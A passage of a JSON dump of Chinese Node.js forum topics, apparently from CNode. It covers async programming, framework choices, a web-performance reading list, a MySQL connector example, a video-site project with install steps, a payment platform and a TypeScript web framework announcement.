}\n}\n</code></pre><p>这里我们利用了<code>once()</code>的特性，将所有的回调都压入事件队列中。在相同的SQL完成时，将得到的结果被所有的回调共同调用，所有回调都只会运行一次，执行完后就会被销毁。并且由于Node单线程的原因，也不用担心数据同步的问题。这个也能应用到其他远程调用的场景，即使外部没有缓存策略，也能节省重复开销。</p>\n<p>不过此处可能会因为监听器过多而产生警告，需要调用<code>setMaxListeners(0)</code>移除掉警告，或者设置更大的警告阙值。</p>\n<blockquote>\n<p>以上知识点均来自&lt;&lt;深入浅出Node.js&gt;&gt;，更多细节建议阅读书籍:-)</p>\n</blockquote>\n</div>","title":"异步编程总结-2","last_reply_at":"2019-05-05T06:12:46.019Z","good":false,"top":false,"reply_count":3,"visit_count":523,"create_at":"2019-05-02T04:43:13.103Z","author":{"loginname":"halu886","avatar_url":"https://avatars1.githubusercontent.com/u/22374024?v=4&s=120"}},{"id":"5cc7ebcd05ae566f637fddd2","author_id":"5ac77987e34737560fccaa7b","tab":"ask","content":"<div class=\"markdown-text\"><p>提问一个关于社保的问题，大佬们帮帮忙</p>\n<p>目前在北京工作，公司缴纳的是全额的社保，公积金的比例也比较高</p>\n<p>但是鉴于现实的情况，落户北京买房是不可能的事情了</p>\n<p>我交那么高的比例的社保，公积金，我以后回老家，我能拿到相应的好处吗？如果只能拿当地水平，我岂不是亏了？</p>\n</div>","title":"【非技术】提问一个关于社保的问题，大佬们帮帮忙","last_reply_at":"2019-05-05T06:06:35.767Z","good":false,"top":false,"reply_count":8,"visit_count":1038,"create_at":"2019-04-30T06:31:41.960Z","author":{"loginname":"BengBu-YueZhang","avatar_url":"https://avatars3.githubusercontent.com/u/24958677?v=4&s=120"}},{"id":"5cce5b535a5bae6e07812df6","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FmgWkquxIMAANCnQHWkYgIm7wFul\" alt=\"image.png\"></p>\n<p>找外包，就搜小程序 “小猿众包”，扫如下码就行了，每天更新外包项目资源：\n<img src=\"//static.cnodejs.org/Fvwzo2PzuWpd8lBzi1s4vf9yz2tn\" alt=\"image.png\"></p>\n</div>","title":"有没有做外包的朋友，兼职做点外包~~","last_reply_at":"2019-05-05T03:41:07.912Z","good":false,"top":false,"reply_count":0,"visit_count":444,"create_at":"2019-05-05T03:41:07.912Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5ca2dc5631010b2dfbb4222f","author_id":"57b99bc2dcaeb5d932db220a","tab":"share","content":"<div class=\"markdown-text\"><h1>Web性能</h1>\n<p>从底层计算机网络协议到应用层各个方面去理解Web性能，此项目可能会涉及到网络、操作系统、编译原理、工程开发等知识，欢迎贡献。\nGithub: <a href=\"https://github.com/laoqiren/web-performance\">https://github.com/laoqiren/web-performance</a></p>\n<h2>目录</h2>\n<ul>\n<li><a href=\"/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/README.md\">网页渲染原理</a>\n<ul>\n<li><a href=\"/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B.md\">渲染过程</a></li>\n<li><a href=\"/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/%E8%B5%84%E6%BA%90%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F.md\">资源加载顺序</a></li>\n<li><a href=\"/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5.md\">浏览器优化策略</a></li>\n<li><a href=\"/%E7%BD%91%E9%A1%B5%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/repaint%E4%B8%8Ereflow.md\">repaint与reflow</a></li>\n</ul>\n</li>\n<li><a href=\"/%E5%B8%A6%E5%AE%BD%E4%B8%8E%E5%BB%B6%E8%BF%9F/README.md\">带宽与延迟</a>\n<ul>\n<li><a href=\"/%E5%B8%A6%E5%AE%BD%E4%B8%8E%E5%BB%B6%E8%BF%9F/%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%BC%80%E5%A7%8B.md\">从输入URL开始</a></li>\n<li><a href=\"/%E5%B8%A6%E5%AE%BD%E4%B8%8E%E5%BB%B6%E8%BF%9F/%E5%B8%A6%E5%AE%BD%E4%B8%8E%E5%BB%B6%E8%BF%9F.md\">带宽与延迟</a></li>\n<li><a href=\"/%E5%B8%A6%E5%AE%BD%E4%B8%8E%E5%BB%B6%E8%BF%9F/TCP%E5%8D%8F%E8%AE%AE%E7%BB%86%E8%8A%82.md\">TCP协议细节</a></li>\n<li>HTTP 1.x性能</li>\n<li>针对性优化</li>\n</ul>\n</li>\n<li><a href=\"/%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/README.md\">缓存机制</a>\n<ul>\n<li><a href=\"/%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5.md\">首部字段</a></li>\n<li><a href=\"/%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%8C%E4%B8%BA.md\">浏览器行为</a></li>\n<li><a href=\"/%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/%E4%BC%98%E5%8C%96.md\">优化</a></li>\n</ul>\n</li>\n<li><a href=\"/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/README.md\">静态资源</a>\n<ul>\n<li><a href=\"/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/%E8%B5%84%E6%BA%90%E5%8E%8B%E7%BC%A9.md\">资源压缩</a></li>\n<li><a href=\"/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/%E5%9B%BE%E5%83%8F%E4%BC%98%E5%8C%96.md\">图片资源优化</a></li>\n<li>离线应用资源</li>\n<li><a href=\"/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/Webpack.md\">Webpack</a></li>\n<li><a href=\"/%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/CDN.md\">CDN</a></li>\n</ul>\n</li>\n<li>响应式编程\n<ul>\n<li><a href=\"/%E5%93%8D%E5%BA%94%E5%BC%8F%E7%BC%96%E7%A8%8B/PubSub%E6%96%B9%E5%BC%8F.md\">Pub/Sub方式</a></li>\n<li><a href=\"/%E5%93%8D%E5%BA%94%E5%BC%8F%E7%BC%96%E7%A8%8B/Vue%E6%96%B9%E5%BC%8F.md\">Vue的方式</a></li>\n<li><a href=\"/%E5%93%8D%E5%BA%94%E5%BC%8F%E7%BC%96%E7%A8%8B/%E8%84%8F%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6.md\">脏检查机制</a></li>\n<li>Rx</li>\n</ul>\n</li>\n<li>Virtual DOM\n<ul>\n<li><a href=\"/%E8%99%9A%E6%8B%9FDOM/React%E5%9F%BA%E7%A1%80.md\">React基础</a></li>\n<li>实现</li>\n<li>diff算法</li>\n<li>性能考虑</li>\n</ul>\n</li>\n<li>SPA与SSR\n<ul>\n<li>SPA问题</li>\n<li>服务端渲染</li>\n<li>同构应用</li>\n<li>性能问题</li>\n</ul>\n</li>\n<li>HTTP2\n<ul>\n<li>新特性概览</li>\n<li>性能提升</li>\n<li>工程实践</li>\n</ul>\n</li>\n<li>HTTPS性能影响\n<ul>\n<li><a href=\"/HTTPS%E6%80%A7%E8%83%BD%E5%BD%B1%E5%93%8D/TLS%E5%8E%9F%E7%90%86.md\">TLS原理</a></li>\n<li><a href=\"/HTTPS%E6%80%A7%E8%83%BD%E5%BD%B1%E5%93%8D/%E6%80%A7%E8%83%BD%E5%BD%B1%E5%93%8D.md\">性能影响</a></li>\n</ul>\n</li>\n<li><a href=\"/%E9%AB%98%E6%80%A7%E8%83%BDJavaScript/README.md\">高性能JavaScript</a>\n<ul>\n<li><a href=\"/%E9%AB%98%E6%80%A7%E8%83%BDJavaScript/V8%E4%B8%8EJIT.md\">V8与JIT</a></li>\n<li><a href=\"/%E9%AB%98%E6%80%A7%E8%83%BDJavaScript/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.md\">内存管理</a></li>\n<li><a href=\"/%E9%AB%98%E6%80%A7%E8%83%BDJavaScript/GC%E6%9C%BA%E5%88%B6.md\">GC机制</a></li>\n<li>内存泄露</li>\n<li>算法与流程</li>\n<li>Web worker</li>\n</ul>\n</li>\n<li>WebAssembly\n<ul>\n<li>编译原理</li>\n<li>性能提升点</li>\n<li>应用场景</li>\n</ul>\n</li>\n<li>PWA与离线应用</li>\n<li>即时应用与P2P\n<ul>\n<li>UDP协议</li>\n<li>WebRTC</li>\n<li>WebSocket</li>\n<li>其他解决方案</li>\n</ul>\n</li>\n<li>Node.js性能优化\n<ul>\n<li><a href=\"/Node%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84.md\">多进程架构</a></li>\n<li><a href=\"/Node%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/Node%E4%B8%AD%E7%9A%84%E5%A4%9A%E8%BF%9B%E7%A8%8B.md\">Node中的多进程</a></li>\n<li><a href=\"/Node%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E5%BC%82%E6%AD%A5IO.md\">异步I/O</a></li>\n<li>Buffer与Stream</li>\n<li>C++扩展</li>\n</ul>\n</li>\n<li>云计算相关\n<ul>\n<li>三大算法</li>\n<li>虚拟技术</li>\n<li>分布式集群</li>\n<li>大数据计算</li>\n</ul>\n</li>\n<li>集群与负载均衡</li>\n<li>数据库相关</li>\n<li>性能测试\n<ul>\n<li>Chrome开发者工具</li>\n<li>benchmark</li>\n<li>压力测试</li>\n</ul>\n</li>\n</ul>\n<h2>引用说明</h2>\n<p>此项目会引用许多其他文章书籍的图片或部分内容，我会尽量都加以注明，如果有部分遗漏以致于侵犯到您的版权，烦请联系我修改！此项目旨在整理零碎的知识和实践方案，方便交流学习，请勿用于商业用途。</p>\n<h2>参与贡献</h2>\n<ul>\n<li>提想法和建议</li>\n<li>纠错完善</li>\n<li>增加新章节或内容</li>\n</ul>\n</div>","title":"性能优化知识与实践整理","last_reply_at":"2019-05-05T03:41:01.686Z","good":false,"top":false,"reply_count":1,"visit_count":1861,"create_at":"2019-04-02T03:51:50.977Z","author":{"loginname":"laoqiren","avatar_url":"https://avatars2.githubusercontent.com/u/16136702?v=4&s=120"}},{"id":"59e783f5c08dd9db362e0f97","author_id":"59227363d371b6372a8afc26","tab":"share","content":"<div class=\"markdown-text\"><p>找java的connector时无意间发现的，一看文档发布日期竟然一个月前就有了\n下载地址https://dev.mysql.com/downloads/connector/nodejs/\n文档https://dev.mysql.com/doc/dev/connector-nodejs/</p>\n<p>版本要求\nNode.js 4.2.x\nMySQL 5.7.19 (挺新的版本了，大多数人应该都要重新下一个，顺便附上下载地址https://dev.mysql.com/downloads/mysql/)\n先安装了再说 <code>npm install @mysql/xdevapi</code></p>\n<p>官方给的示例代码</p>\n<pre class=\"prettyprint language-javascript\"><code>const mysql = require(&#x27;@mysql&#x2F;xdevapi&#x27;);\n\nmysql\n    .getSession({\n        host: &#x27;localhost&#x27;,\n        port: 33060,\n        dbUser: &#x27;user&#x27;,\n        dbPassword: &#x27;passwd&#x27;\n    })\n    .then(session =&gt; {\n        console.log(&#x27;Session created&#x27;);\n\n        return session.createSchema(&#x27;test_schema&#x27;);\n    })\n    .then(schema =&gt; {\n        console.log(&#x27;Schema created&#x27;);\n\n        return schema.createCollection(&#x27;myCollection&#x27;);\n    })\n    .then(collection =&gt; {\n        console.log(&#x27;Collection created&#x27;)\n\n        return Promise.all([\n            collection\n                .add({ baz: { foo: &#x27;bar&#x27; } }, { foo: { bar: &#x27;baz&#x27; } })\n                .execute(),\n            collection\n                .find(&quot;$.baz.foo == &#x27;bar&#x27;&quot;)\n                .execute(row =&gt; {\n                    console.log(&#x27;Found row: %j&#x27;, row);\n                })\n                .then(res =&gt; {\n                    console.log(&#x27;Collection find finished&#x27;);\n                }),\n            collection\n                .remove(&quot;($.foo.bar) == &#x27;baz&#x27;&quot;)\n                .execute()\n                .then(() =&gt; {\n                    console.log(&#x27;Document deleted&#x27;);\n                }),\n            collection\n                .drop()\n                .then(() =&gt; {\n                    console.log(&#x27;Collection deleted&#x27;);\n                })\n        ]);\n    })\n    .then(() =&gt; {\n        return session.dropSchema(&#x27;test_schema&#x27;);\n    })\n    .then(() =&gt; {\n        console.log(&#x27;Schema deleted&#x27;);\n\n        return session.close();\n    })\n    .then(() =&gt; {\n        console.log(&#x27;Session destroyed&#x27;);\n    })\n    .catch(err =&gt; {\n        console.log(err.stack);\n    });\n</code></pre><p>看起来相当不错，可以去尝试一下了</p>\n</div>","title":"刚发现MySQL发布了Node的Connector","last_reply_at":"2019-05-05T03:08:42.171Z","good":false,"top":false,"reply_count":2,"visit_count":1748,"create_at":"2017-10-18T16:40:21.087Z","author":{"loginname":"dislido","avatar_url":"https://avatars2.githubusercontent.com/u/25094788?v=4&s=120"}},{"id":"5ccdb469776fb66e0d171c1d","author_id":"545b74143e1f39344c5b3bee","tab":"ask","content":"<div class=\"markdown-text\"><p>有这种工具吗？</p>\n<p>n=3</p>\n<pre class=\"prettyprint\"><code>\t\t\t&#x27;&#x27;:{\n\t\t\t\t&#x27;&#x27;:{\n\t\t\t\t\t&#x27;&#x27;:{\n\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n</code></pre><p>n=2</p>\n<pre class=\"prettyprint\"><code>\t\t\t&#x27;&#x27;:{\n\t\t\t\t&#x27;&#x27;:{\n\t\t\t\t}\n\t\t\t}\n</code></pre></div>","title":"vscode生成n层嵌套json，有什么好插件？","last_reply_at":"2019-05-05T03:03:53.959Z","good":false,"top":false,"reply_count":2,"visit_count":336,"create_at":"2019-05-04T15:48:57.756Z","author":{"loginname":"chapgaga","avatar_url":"https://avatars0.githubusercontent.com/u/9590859?v=4&s=120"}},{"id":"5b852286632c7f422e5b81e5","author_id":"5b85221808d0b0fb2d8e6c84","tab":"ask","content":"<div class=\"markdown-text\"><p>最近想用node.js重构公司后端。egg.js和nest.js改选择哪一个作为系统框架呢，大神们给点意见？</p>\n</div>","title":"egg.js和nest.js改选择哪一个作为系统框架呢，大神们给点意见？","last_reply_at":"2019-05-05T01:33:57.930Z","good":false,"top":false,"reply_count":60,"visit_count":8009,"create_at":"2018-08-28T10:23:02.365Z","author":{"loginname":"danielmlc","avatar_url":"https://avatars2.githubusercontent.com/u/16604995?v=4&s=120"}},{"id":"5ccdb79d776fb66e0d171c2a","author_id":"5b376dfcac8bc1e124114500","tab":"share","content":"<div class=\"markdown-text\"><p>用过两个编程之后就会觉得他们非常相近, 两个代表作分别是 JS 的 eventEmitter 和 Rxjs</p>\n<p>了解之后 reactive  programming (响应式) 其实是基于 event data programing (事件驱动) 的方式来处理 <strong>数据流</strong>,</p>\n<p>Event data programming: <strong>当某个件事情发生我再做某些事情</strong></p>\n<p>Reactive programming: <strong>当某个件事情发生事件告诉我, 在这之前你可以吧数据处理好先</strong></p>\n<p>Event data programming 和 Reactive programming 区别在于:</p>\n<ol>\n<li>Event data programming 事件是全局性的当发出一个信号大家都会听看看是不是自己的, reactive programing 每个事件是唯一的, 如果你想监听这个事件你需要订阅它, 在这方面感觉 reactive 极大优化了性能.</li>\n<li>Event data programing 只处理事件, Reactive programming 除了可以订阅事件还可以订阅某个数据变化.</li>\n</ol>\n</div>","title":"响应式 和 事件驱动编程 区别","last_reply_at":"2019-05-04T16:02:37.820Z","good":false,"top":false,"reply_count":0,"visit_count":306,"create_at":"2019-05-04T16:02:37.820Z","author":{"loginname":"tmirun","avatar_url":"https://avatars1.githubusercontent.com/u/8052536?v=4&s=120"}},{"id":"5bb0bf6f37a6965f59051df3","author_id":"5ba61ea38f5b0c1c59ea10b6","tab":"share","content":"<div class=\"markdown-text\"><h2>在线体验地址:<a href=\"http://vip.52tech.tech/\">http://vip.52tech.tech/</a></h2>\n<h2>GIthub源码：<a href=\"https://github.com/xiugangzhang/vip.github.io\">https://github.com/xiugangzhang/vip.github.io</a></h2>\n<h2>项目预览</h2>\n<p><img src=\"//static.cnodejs.org/FmjZMm4b3MUqJIuSB5aYS2PEW0pf\" alt=\"preview.jpg\"></p>\n<ul>\n<li>主页面\n<img src=\"//static.cnodejs.org/FhTjrj9HgY37ojGYNdLWupmBfSyv\" alt=\"preview.jpg\"></li>\n<li>登录页面\n<img src=\"//static.cnodejs.org/FrZr5Mck4VQD9ndVXhJGqA9XwHsU\" alt=\"login.jpg\"></li>\n<li>注册页面\n<img src=\"//static.cnodejs.org/FnXwM1CtMBcA7cFv66vlYb-t559E\" alt=\"register.jpg\"></li>\n<li>会员中心\n<img src=\"//static.cnodejs.org/FtCfCUeeIA8Y0WnYkhvzqlweqPbs\" alt=\"user.jpg\"></li>\n<li>电影播放页面\n<img src=\"//static.cnodejs.org/FryrTyzEeEFuOgD1uXrkwF4MzXn-\" alt=\"play.jpg\"></li>\n<li>电影弹幕功能\n<img src=\"//static.cnodejs.org/FhcOXAvbMZuafMrJzU00fMvRXot9\" alt=\"danmu.jpg\"></li>\n</ul>\n<h2>视频网站项目已经完功能如下：</h2>\n<h3>v1.0.3（当前最新版本）</h3>\n<ul>\n<li>\n<ol>\n<li>增加自动抓取功能，网站数据定期实时更新</li>\n</ol>\n<ul>\n<li>电影和电视剧数据抓取</li>\n<li>电影数据信息前端展现</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>电影页面图片的自动抓取、下载和展示</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>代码结构调整</li>\n</ol>\n</li>\n</ul>\n<h3>v1.0.2</h3>\n<ul>\n<li>\n<ol>\n<li>简化程序安装流程，新增可视化安装界面</li>\n</ol>\n<ul>\n<li>用户可直接输入数据库名、数据库地址、数据库用户名、数据库密码信息一键完成程序的安装</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>页面部分结构的调整</li>\n</ol>\n</li>\n</ul>\n<h3>v1.0.1</h3>\n<ul>\n<li>\n<ol>\n<li>用户中心的管理</li>\n</ol>\n<ul>\n<li>对于已经注册的用户，实现用户基本信息的修改</li>\n<li>用户密码的修改</li>\n<li>用户评论记录的查看</li>\n<li>用户收藏电影的查看和播放</li>\n<li>用户登录日志的查看</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>电影搜索功能（特色功能）</li>\n</ol>\n<ul>\n<li>实现了根据视频播放地址和视频名称全网视频的搜索和播放功能</li>\n<li>实现了正在热映，即将上映和TOP250的电影列表的展示</li>\n<li>电影收藏和取消功能</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>弹幕功能（特色功能）</li>\n</ol>\n<ul>\n<li>类似于B站等其他视频网站的弹幕功能，用户在登录之后可以实现在线发言</li>\n</ul>\n</li>\n</ul>\n<h3>v1.0.0</h3>\n<ul>\n<li>\n<ol>\n<li>用户主页的搭建：</li>\n</ol>\n<ul>\n<li>实现了主页轮播图的显示和切换，用户可以从数据库中自由配置和切换轮播图的显示</li>\n<li>实现了主页电影列表的显示：从数据库文件读取电影和电视剧列表信息并在前台显示</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>用户登录和注册页面的搭建：</li>\n</ol>\n<ul>\n<li>实现了用户的登录和注册功能</li>\n<li>用户注册和登录验证码提示功能</li>\n</ul>\n</li>\n<li>\n<ol>\n<li>电影播放页面的搭建</li>\n</ol>\n<ul>\n<li>对于其他页面的任意可以展现电影列表的页面，用户可以直接点击列表，直接进入播放页面</li>\n<li>播放页面电影详细信息的展现</li>\n<li>对于加载速度较慢的视频，用户可以自由切换播放接口进行加速</li>\n<li>用户可以在相应的播放页面查看其他用户已经发表的评论，同时也可以在登录之后自由发表评论</li>\n</ul>\n</li>\n</ul>\n<h3>其他</h3>\n<ul>\n<li>\n<ol>\n<li>页面整体的风格模仿了Discuz等论坛网站的布局</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>网站首页的轮播图效果模仿了优酷、爱奇艺、腾讯视频等主流视频网站的轮播图效果，并且对该部分的效果实现进行了代码封装</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>电影底部的的友情链接，使用了大部分网站的分栏布局，用户可以添加自己的QQ群以及微信公众号方便增加自己网站的人气</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>主要列表的分页功能，对于一些内容显示较多的不能再一页显示完整的页面，使用了ajax无刷新分页对数据进行多条展示，提高了用户的体验</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>目前主流浏览器中也做了相应测试，建议大家使用谷歌或者火狐浏览器，效果可能会更好</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>未使用其他第三方框架，首页和播放页均为纯原生的HTML，CSS， js实现（至于这个xframe-min-1.0.js文件可以参见我的GitHub xframe.js这个开源项目）</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>电影播放页面：此处也是类似于当前主流网站的的播放页面，左侧为播放窗口，右侧部分为电影的详细信息</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>底部导航：使用分栏的方式实现了底部的导航，前面的为友情链接，后面的一个为网站的微信，Q微博等联系方式</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>用户中心：这部分实现了修改密码，评论，登录，日志管理，收藏电影的功能，用户可以自由切换</li>\n</ol>\n</li>\n</ul>\n<h2>程序目录结构说明</h2>\n<pre class=\"prettyprint\"><code>vip.github.io:\n├─controllers               &#x2F;&#x2F; 控制层\n├─data                      &#x2F;&#x2F; 数据抓取层\n├─logs                      &#x2F;&#x2F; 后台日志\n│  ├─errlog                 &#x2F;&#x2F; 错误日志\n│  ├─othlog                 &#x2F;&#x2F; 其他日志\n│  └─reqlog                 &#x2F;&#x2F; 请求日志\n├─models                    &#x2F;&#x2F; 模型层\n├─static                    &#x2F;&#x2F; 静态页\n│  ├─css                    &#x2F;&#x2F; 样式表\n│  ├─images                 &#x2F;&#x2F; 静态图片资源\n│  └─js                     &#x2F;&#x2F; js脚本\n├─utils                     &#x2F;&#x2F; 工具相关\n├─views                     &#x2F;&#x2F; 视图层\n└─www                       &#x2F;&#x2F; 静态资源\n    ├─css                   &#x2F;&#x2F; 样式表\n    ├─html                  &#x2F;&#x2F; html文件\n    ├─images                &#x2F;&#x2F; 静态图片资源\n    ├─js                    &#x2F;&#x2F; js脚本\n    │  └─movielist          &#x2F;&#x2F; 搜索页电影列表\n    │      ├─components     &#x2F;&#x2F; top250&#x2F;即将上映\n    │      └─in_theaters    &#x2F;&#x2F; 正在热映\n    └─uploads               &#x2F;&#x2F; 文件上传目录\n        ├─avatar            &#x2F;&#x2F; 用户图像\n        └─movie             &#x2F;&#x2F; 电影图标\n\n</code></pre><h2>程序安装方法</h2>\n<ul>\n<li>\n<ol>\n<li>确保电脑已经安装了NodeJS环境，运行版本尽量保持最新（V8以上吧），选择本地的一个路径，然后运行命令：</li>\n</ol>\n</li>\n</ul>\n<pre class=\"prettyprint\"><code>   git clone https:&#x2F;&#x2F;github.com&#x2F;xiugangzhang&#x2F;vip.github.io.git\n</code></pre><ul>\n<li>\n<ol>\n<li>进入程序的主目录（包含app.js的那个文件夹）运行命令：npm install，系统就会自动安装该程序的依赖包；</li>\n</ol>\n</li>\n<li>\n<ol>\n<li>在以上的步骤都执行完成且正确的情况下，就可以在程序主目录下面（有app.js的那个目录）,运行命令</li>\n</ol>\n</li>\n</ul>\n<pre class=\"prettyprint\"><code>   node app.js\n</code></pre><p>之后就会自动在浏览器中打开本程序安装的主界面；</p>\n<ul>\n<li>\n<ol>\n<li>如果是windows环境下，本程序提供了可视化的安装。用户可在程序的安装界面输入数据库名、数据库主机地址、数据库用户名、数据库密码，之后点击按钮立即安装即可，在输入的参数全部正确的情况下，就会后台自动安装程序，安装成功之后会自动跳转到网站首页；\n<img src=\"//static.cnodejs.org/FqNdjsfo5whahU-WvEC8WOpBBXA5\" alt=\"installing.jpg\"></li>\n</ol>\n</li>\n<li>\n<ol>\n<li>如果是Linux环境下，请提前准备好数据库名（database=video）、数据库主机地址（host=localhost）、数据库用户名（user=root）、数据库密码（password=123456 ），按照如下格式保存为config.properties文件，请确保这里的配置信息和你的数据库配置信息完全一致；</li>\n</ol>\n</li>\n</ul>\n<pre class=\"prettyprint\"><code>    database=video               \n    host=localhost          \n    user=root               \n    password=123456         \n</code></pre><ul>\n<li>\n<ol>\n<li>在线演示站点：<a href=\"http://vip.52tech.tech\">http://vip.52tech.tech</a></li>\n</ol>\n</li>\n<li>\n<ol>\n<li>对于安装和使用的过程中如果有什么问题和建议，也欢迎交流和提出建议，可以在issue去发起话题讨论，或直接联系邮箱：tech52admin@126.com</li>\n</ol>\n</li>\n</ul>\n</div>","title":"【VIP视频网站项目】基于Nodejs开发的VIP视频网站项目及源码分享【v1.0.3版】","last_reply_at":"2019-05-04T08:45:39.768Z","good":false,"top":false,"reply_count":24,"visit_count":16141,"create_at":"2018-09-30T12:19:59.585Z","author":{"loginname":"xiugangzhang","avatar_url":"https://avatars3.githubusercontent.com/u/29092258?v=4&s=120"}},{"id":"5c09f4bc15a4d545e3f4c18e","author_id":"5c09d26ed3b8ab334e8dba63","tab":"ask","content":"<div class=\"markdown-text\"><p>是学php还是nodejs,主要想学习一下服务端语言,其实是想学习node的，但是感觉nodejs的相关书籍还有资料比较少,遇到问题网上不一定查的到，这样的话学习起来不很困难吗? 而且数据库好多都是用mongodb，但是想用mysql啊，大家都是怎么学的?</p>\n</div>","title":"nodejs怎么学习啊?感觉资料很少啊","last_reply_at":"2019-05-04T02:57:36.970Z","good":false,"top":false,"reply_count":26,"visit_count":3445,"create_at":"2018-12-07T04:19:08.132Z","author":{"loginname":"yt7649757","avatar_url":"https://avatars3.githubusercontent.com/u/25155154?v=4&s=120"}},{"id":"5ccc27f8776fb66e0d1719c2","author_id":"5c2f299a5bf06c5e7e3f15d5","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/NuoHui/fe-note/issues\">Vue全家桶源码分析</a></p>\n<p>慢慢学习中。</p>\n</div>","title":"有没有对Vue全家桶源码感兴趣对, 一起来issues交流。","last_reply_at":"2019-05-03T11:37:28.214Z","good":false,"top":false,"reply_count":0,"visit_count":415,"create_at":"2019-05-03T11:37:28.214Z","author":{"loginname":"NuoHui","avatar_url":"https://avatars2.githubusercontent.com/u/42414989?v=4&s=120"}},{"id":"5cc5c9ab37faec0ce1d07c49","author_id":"5cc5270637faec0ce1d0785c","tab":"share","content":"<div class=\"markdown-text\"><h1><a href=\"https://xorpay.com\">XorPay 支付平台介绍</a></h1>\n<blockquote>\n<p><a href=\"https://xorpay.com\">XorPay</a>  定位为个人 / 独立开发者 / 个体户 / 小微企业提供安全、简单、稳定、正规的收款服务。目前支持 支付宝当面付 和 微信 NATIVE / JSAPI / 收银台 / 小程序 等支付方式，资金由支付宝或微信官方T+1结算自动下发个人银行卡。(支付宝为即时到账)</p>\n</blockquote>\n<h3>为什么开发 XorPay 支付平台</h3>\n<blockquote>\n<p>我们知道作为独立开发者产品需要收款是多么麻烦，注册公司维护成本太高，市面上各种收款工具要么手续费太高，要么到账很慢，体验很不好。于是我们开发了<a href=\"https://xorpay.com\">「XorPay 支付平台」</a> 用来解决这个问题，希望可以帮助到每个默默前行的独立开发者。</p>\n</blockquote>\n<h3>支持接口</h3>\n<ul>\n<li><a href=\"https://xorpay.com/doc/sign.html\">签名算法</a></li>\n<li><a href=\"https://xorpay.com/doc/alipay.html\">支付宝当面付</a></li>\n<li><a href=\"https://xorpay.com/doc/native.html\">NATIVE 扫码支付</a></li>\n<li><a href=\"https://xorpay.com/doc/cashier.html\">收银台支付</a></li>\n<li><a href=\"https://xorpay.com/doc/mini.html\">小程序支付</a></li>\n<li><a href=\"https://xorpay.com/doc/jsapi.html\">JSAPI 网页支付</a></li>\n<li><a href=\"https://xorpay.com/doc/query.html\">订单状态查询</a></li>\n<li><a href=\"https://xorpay.com/doc/notify.html\">回调通知</a></li>\n<li><a href=\"https://xorpay.com/doc/openid.html\">获取 OPENID</a></li>\n</ul>\n<h3>链接</h3>\n<ul>\n<li><a href=\"https://xorpay.com\">XorPay 官网</a></li>\n<li><a href=\"https://xorpay.com/doc\">API 文档</a></li>\n<li><a href=\"https://github.com/xorpay\">Github 仓库</a></li>\n</ul>\n<p>欢迎提问交流</p>\n</div>","title":"XorPay 个人支付平台【支持个人微信支付和支付宝支付接口】","last_reply_at":"2019-05-03T05:57:07.673Z","good":false,"top":false,"reply_count":4,"visit_count":870,"create_at":"2019-04-28T15:41:31.251Z","author":{"loginname":"xorpay","avatar_url":"https://avatars1.githubusercontent.com/u/48086955?v=4&s=120"}},{"id":"5cc3b7b737faec0ce1d072ff","author_id":"4efc278625fa69ac690004c5","tab":"share","content":"<div class=\"markdown-text\"><p>1290年了，使用TypeScript来代替Javascript来构建我们的前后端应用，已经在社区达成共识，去年在新浪移动大前端团队，也积极的投入到了TypeScript的学习和开发之中来。</p>\n<p>经过大概半年多的业务迭代，我们内部从一开始就计划开发一款拥有完整TypeScript开发体验的Nodejs Web框架。</p>\n<p>经过几个版本的迭代后，我们终于开源了团队的内部web框架，Daruk。</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/daruk-framework/daruk\">Daruk</a></p>\n<blockquote>\n<p>Daruk是一款基于 Koa2，使用 typescript 开发的轻量级 web 框架。使用过 koa2 框架的朋友应该知道，koa2 属于比较原始和基础的 http server 